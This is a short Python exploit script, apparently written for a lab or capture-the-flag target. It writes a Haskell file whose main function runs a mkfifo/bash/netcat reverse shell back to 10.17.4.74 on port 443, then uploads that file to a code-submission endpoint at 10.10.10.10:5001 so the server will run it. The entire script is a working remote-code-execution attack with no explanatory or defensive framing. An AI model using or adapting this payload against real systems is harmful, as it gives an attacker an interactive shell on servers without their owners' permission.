import requests as r

URL = "http://10.10.10.10:5001/submit"

payload = '''

module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.17.4.74 443 >/tmp/f"
'''
with open("re.hs" ,'w') as f:
    f.write(payload)
    with open("re.hs","rb") as f:
        try:
            test = r.post(URL,files ={"file":f})
        except r.exceptions.ConnectionError:
            print("Upload completed successfully!")
